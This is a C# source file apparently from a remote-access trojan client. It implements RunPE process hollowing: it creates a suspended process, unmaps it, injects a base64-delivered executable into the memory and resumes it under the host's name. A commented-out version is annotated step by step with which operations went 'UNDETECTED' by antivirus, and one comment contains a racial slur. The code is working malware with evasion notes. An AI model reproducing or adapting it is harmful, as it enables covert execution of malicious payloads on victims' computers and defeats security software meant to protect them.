using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Windows.Forms;

namespace xClient.Core.Helper
{
    class RunPE
    {
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr ProcessHandle;
            public IntPtr ThreadHandle;
            public uint ProcessId;
            public uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct STARTUP_INFORMATION
        {
            public uint Size;
            public string Reserved1;
            public string Desktop;
            public string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            public byte[] Misc;
            public IntPtr Reserved2;
            public IntPtr StdInput;
            public IntPtr StdOutput;
            public IntPtr StdError;
        }

        private static Client current = null;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);

        /*[SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref RunPE.STARTUP_INFORMATION startupInfo, ref RunPE.PROCESS_INFORMATION processInformation);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("ntdll.dll")]
        private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern int ResumeThread(IntPtr handle);*/

        private delegate bool CreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles,
   uint creationFlags, IntPtr environment, string currentDirectory, ref STARTUP_INFORMATION startupInfo, ref PROCESS_INFORMATION processInformation);

        private delegate bool RPM(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        private delegate bool ReadProcessMemory2(IntPtr process, int baseAddress, ref byte[] buffer, int bufferSize, ref int bytesRead);
        private delegate bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        private delegate bool GetThreadContext(IntPtr thread, int[] context);
        private delegate bool SetThreadContext(IntPtr thread, int[] context);
        private delegate int NtUnmapViewOfSection(IntPtr process, int baseAddress);
        private delegate int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        private delegate int ResumeThread(IntPtr handle);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="args">First is base64 payload, second is net, self, or sys, third is the exe to inj into without .exe</param>
        public static void Invoke(string[] args, Client client)
        {
            current = client;
            byte[] data = Convert.FromBase64String(args[0]);
            string text = "";
            if (args[1] == "net")
            {
                text = RuntimeEnvironment.GetRuntimeDirectory();
                text = text.Replace(text.Split(new char[]
			{
				'\\'
			})[text.Split(new char[]
			{
				'\\'
			}).Length - 2], "v2.0.50727");
                text = System.IO.Path.Combine(text, args[2] + ".exe");
            }
            if (args[1] == "sys")
            {
                text = Path.Combine(Environment.SystemDirectory, args[2] + ".exe");
            }
            if (args[1] == "self")
            {
                text = Assembly.GetEntryAssembly().Location;
            }
            if (args[1] == "swi")
            {
                text = args[2];
            }
            //MessageBox.Show("Nigger");
            //MessageBox.Show(text + " " + data.Length);
            RunPE.Run(text, "", data, true);
        }
        public static bool Run(string path, string cmd, byte[] data, bool compatible)
        {
            bool result;
            for (int i = 1; i <= 5; i++)
            {
                if (RunPE.HandleRun(path, cmd, data, compatible))
                {
                    result = true;
                    return result;
                }
            }
            result = false;
            return result;
        }


        private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
        {
            CreateProcessA createProc = makeAPI<CreateProcessA>("kernel32", "CreateProcessA");
            RPM readProcessMemory = makeAPI<RPM>("kernel32", "ReadProcessMemory");
            ReadProcessMemory2 readProcessMemory2 = makeAPI<ReadProcessMemory2>("kernel32", "ReadProcessMemory");
            WriteProcessMemory writeProcessMemory = makeAPI<WriteProcessMemory>("kernel32", "WriteProcessMemory");
            GetThreadContext getThreadContext = makeAPI<GetThreadContext>("kernel32", "GetThreadContext");
            SetThreadContext setThreadContext = makeAPI<SetThreadContext>("kernel32", "SetThreadContext");
            NtUnmapViewOfSection ntUnmapViewOfSection = makeAPI<NtUnmapViewOfSection>("ntdll", "NtUnmapViewOfSection");
            VirtualAllocEx virtualAllocEx = makeAPI<VirtualAllocEx>("kernel32", "VirtualAllocEx");
            ResumeThread resumeThread = makeAPI<ResumeThread>("kernel32", "ResumeThread");

            int ReadWrite = 0;
            string pPath = path;//Application.ExecutablePath;
            string QuotedPath = string.Format("\"{0}\"", pPath);

            STARTUP_INFORMATION SI = new STARTUP_INFORMATION();
            PROCESS_INFORMATION PI = new PROCESS_INFORMATION();

            SI.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(STARTUP_INFORMATION)));

            try
            {
                if (string.IsNullOrEmpty(cmd))
                {
                    if (!createProc(pPath, QuotedPath, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref SI, ref PI))
                        throw new Exception();
                }
                else
                {
                    QuotedPath = QuotedPath + " " + cmd;
                    if (!createProc(pPath, QuotedPath, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref SI, ref PI))
                        throw new Exception();
                }

                int FileAddress = BitConverter.ToInt32(data, 60);
                int ImageBase = BitConverter.ToInt32(data, FileAddress + 52);

                int[] Context = new int[179];
                Context[0] = 65538;

                if (!getThreadContext(PI.ThreadHandle, Context))
                    throw new Exception();

                int Ebx = Context[41];
                int BaseAddress = 0;
                if (!readProcessMemory(PI.ProcessHandle, Ebx + 8, ref BaseAddress, 4, ref ReadWrite))
                    throw new Exception();

                if (ImageBase == BaseAddress)
                {
                    if (!(ntUnmapViewOfSection(PI.ProcessHandle, BaseAddress) == 0))
                        throw new Exception();
                }

                int SizeOfImage = BitConverter.ToInt32(data, FileAddress + 80);
                int SizeOfHeaders = BitConverter.ToInt32(data, FileAddress + 84);

                bool AllowOverride = false;
                int NewImageBase = virtualAllocEx(PI.ProcessHandle, ImageBase, SizeOfImage, 12288, 64);

                //This is the only way to execute under certain conditions. However, it may show
                //an application error probably because things aren't being relocated properly.

                if (!compatible && NewImageBase == 0)
                {
                    AllowOverride = true;
                    NewImageBase = virtualAllocEx(PI.ProcessHandle, 0, SizeOfImage, 12288, 64);
                }

                if (NewImageBase == 0)
                    throw new Exception();

                if (!writeProcessMemory(PI.ProcessHandle, NewImageBase, data, SizeOfHeaders, ref ReadWrite))
                    throw new Exception();

                int SectionOffset = FileAddress + 248;
                short NumberOfSections = BitConverter.ToInt16(data, FileAddress + 6);

                for (int I = 0; I <= NumberOfSections - 1; I++)
                {
                    int VirtualAddress = BitConverter.ToInt32(data, SectionOffset + 12);
                    int SizeOfRawData = BitConverter.ToInt32(data, SectionOffset + 16);
                    int PointerToRawData = BitConverter.ToInt32(data, SectionOffset + 20);

                    if (!(SizeOfRawData == 0))
                    {
                        byte[] SectionData = new byte[SizeOfRawData];
                        Buffer.BlockCopy(data, PointerToRawData, SectionData, 0, SectionData.Length);

                        if (!writeProcessMemory(PI.ProcessHandle, NewImageBase + VirtualAddress, SectionData, SectionData.Length, ref ReadWrite))
                            throw new Exception();
                    }

                    SectionOffset += 40;
                }

                byte[] PointerData = BitConverter.GetBytes(NewImageBase);
                if (!writeProcessMemory(PI.ProcessHandle, Ebx + 8, PointerData, 4, ref ReadWrite))
                    throw new Exception();

                int AddressOfEntryPoint = BitConverter.ToInt32(data, FileAddress + 40);

                if (AllowOverride)
                    NewImageBase = ImageBase;
                Context[44] = NewImageBase + AddressOfEntryPoint;

                if (!setThreadContext(PI.ThreadHandle, Context))
                    throw new Exception();
                if (resumeThread(PI.ThreadHandle) == -1)
                    throw new Exception();
                // create a new thread

                new Packets.ClientPackets.Status("Executed in memory!").Execute(current);
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.Status("RunPE Error: " + ex.Message).Execute(current);
                Process P = Process.GetProcessById(Convert.ToInt32(PI.ProcessId));
                if (P != null)
                    P.Kill();

                return false;
            }
            return true;
        }

      
        private static T makeAPI<T>(string name, string method)
        {
            IntPtr addr = GetProcAddress(LoadLibrary(name), method);

            object d = Marshal.GetDelegateForFunctionPointer(addr, typeof(T));
            return (T)d;
        }





        /*
        private static bool HandleRun2(string path, string cmd, byte[] data, bool compatible)
        {
            int num = 0;
            string text = string.Format("\"{0}\"", path);
            RunPE.STARTUP_INFORMATION targetProcessStartInfo = default(RunPE.STARTUP_INFORMATION);
            RunPE.PROCESS_INFORMATION targetProcessInfo = default(RunPE.PROCESS_INFORMATION);
            targetProcessStartInfo.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(RunPE.STARTUP_INFORMATION)));
            bool result;
            try
            {

                // START FIRST TEST
                if (!string.IsNullOrEmpty(cmd))
                {
                    text = text + " " + cmd;
                }
                if (!RunPE.CreateProcess(path, text, IntPtr.Zero, IntPtr.Zero, false, 4u, IntPtr.Zero, null, ref targetProcessStartInfo, ref targetProcessInfo))
                {
                    throw new Exception("Creating of the process failed");
                }
                // END FIRST TEST: UNDETECTED
                //if (targetProcessInfo.ThreadHandle != IntPtr.Zero)
                //{
               //     MessageBox.Show("WE GOOD");
               // }
                //MessageBox.Show(targetProcessInfo.ThreadId.ToString());
                // START SECOND TEST
                int num2 = BitConverter.ToInt32(data, 60);
                int num3 = BitConverter.ToInt32(data, num2 + 52);
                int[] array = new int[179];
                array[0] = 65538;
                //if (IntPtr.Size == 4)
                {
                    // 32bit windows
                    if (!RunPE.GetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception("32bit get thread context failed");
                    }
                }
                else
                {
                    // windows 64 bit
                    if (!RunPE.Wow64GetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception("64bit get thread context failed");
                    }
                }
                // END SECOND TEST: UNDETECTED

                // START THIRD TEST
                int num4 = array[41];
                int num5 = 0;
                if (!RunPE.ReadProcessMemory(targetProcessInfo.ProcessHandle, num4 + 8, ref num5, 4, ref num))
                {
                    throw new Exception("Read failed 1");
                }
                if (num3 == num5)
                {
                    if (RunPE.NtUnmapViewOfSection(targetProcessInfo.ProcessHandle, num5) != 0)
                    {
                        throw new Exception("Unmap failed");
                    }
                }
                // END THIRD TEST: UNDTECTED


                // START FOURTH TEST
                int length = BitConverter.ToInt32(data, num2 + 80);
                int bufferSize = BitConverter.ToInt32(data, num2 + 84);
                bool flag = false;
                int num6 = RunPE.VirtualAllocEx(targetProcessInfo.ProcessHandle, num3, length, 12288, 64);
                if (!compatible && num6 == 0)
                {
                    flag = true;
                    num6 = RunPE.VirtualAllocEx(targetProcessInfo.ProcessHandle, 0, length, 12288, 64);
                }
                if (num6 == 0)
                {
                    throw new Exception("Num6 was 0");
                }
                if (!RunPE.WriteProcessMemory(targetProcessInfo.ProcessHandle, num6, data, bufferSize, ref num))
                {
                    throw new Exception("First first write proc failed");
                }

                // START 5th TEST
                int num7 = num2 + 248;
                short num8 = BitConverter.ToInt16(data, num2 + 6);
                for (int i = 0; i <= (int)(num8 - 1); i++)
                {
                    int num9 = BitConverter.ToInt32(data, num7 + 12);
                    int num10 = BitConverter.ToInt32(data, num7 + 16);
                    int srcOffset = BitConverter.ToInt32(data, num7 + 20);
                    if (num10 != 0)
                    {
                        byte[] array2 = new byte[num10];
                        Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
                        if (!RunPE.WriteProcessMemory(targetProcessInfo.ProcessHandle, num6 + num9, array2, array2.Length, ref num))
                        {
                            throw new Exception("First writing process failed");
                        }
                    }
                    num7 += 40;
                }
                // END 5th TEST: UNDETECTED


                // THIS IS THE ISSUE
                // 2x WriteProcessMemory
                // ANYTHING FROM HERE ON IN WILL RESULT IN DETECTION AFTER THREAD RESUMED.

                // START 6th TEST
                byte[] bytes = BitConverter.GetBytes(num6);
                if (!RunPE.WriteProcessMemory(targetProcessInfo.ProcessHandle, num4 + 8, bytes, 4, ref num))
                {
                    throw new Exception("Writing process memory failed");
                }
                int num11 = BitConverter.ToInt32(data, num2 + 40);
                if (flag)
                {
                    num6 = num3;
                }

                // END 6th TEST: UNDETECTED

                // START 7th TEST: UNDETECTED
                array[44] = num6 + num11;
                //if (IntPtr.Size == 4)
                {
                    if (!RunPE.SetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception("32bit LastSetContext");
                    }
                }
                else
                {
                    if (!RunPE.Wow64SetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception("64bit LastSetContext");
                    }
                }
                // END 7th TEST: UNDETECTED



                RunPE.ReadProcessMemory(targetProcessInfo.ProcessHandle, 0x0, ref num5, 4, ref num);

                //if (IntPtr.Size == 4)
                {
                    // 32bit windows
                    if (!RunPE.GetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception("32bit Last Get Context");
                    }
                }
                else
                {
                    // windows 64 bit
                    if (!RunPE.Wow64GetThreadContext(targetProcessInfo.ThreadHandle, array))
                    {
                        throw new Exception("64bit Last Get Context");
                    }
                }


                if (RunPE.ResumeThread(targetProcessInfo.ThreadHandle) == -1)
                {
                    throw new Exception("Resuming thread");
                }
            }
            catch (Exception ex)
            {

                new Packets.ClientPackets.Status("RunPE Error: " + ex.ToString()).Execute(current);

                Process processById = Process.GetProcessById(Convert.ToInt32(targetProcessInfo.ProcessId));
                if (processById != null)
                {
                    processById.Kill();
                }
                result = false;
                return result;
            }
            result = true;
            return result;
        }
        */
    }
}
